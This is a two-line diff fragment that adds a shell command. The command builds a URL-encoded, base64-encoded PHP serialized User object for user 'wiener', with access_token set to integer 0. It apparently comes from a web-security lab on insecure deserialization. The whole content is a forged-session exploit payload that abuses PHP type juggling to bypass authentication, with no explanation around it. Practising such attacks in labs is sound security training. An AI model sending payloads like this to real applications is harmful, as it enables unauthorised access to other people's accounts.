@@ -1,0 +1,2 @@
+urlencode $(echo -n 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";i:0;}'|base64|tr -d '\n')
+
